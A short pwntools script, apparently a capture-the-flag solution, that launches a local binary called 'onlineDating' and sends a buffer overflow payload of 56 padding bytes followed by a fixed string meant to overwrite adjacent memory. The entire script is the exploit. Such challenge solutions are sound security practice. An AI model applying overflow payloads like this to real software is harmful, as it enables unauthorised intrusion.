from pwn import *
elf= ELF('./onlineDating')
print(elf.symbols)

with process('./onlineDating') as p:
    print(p.recv())
    payload = b'A'*56 + b'Gerard_PiqueClara_C.TwingoOoCasioOo!'          
    p.sendline(payload)
    print(p.recv())
    
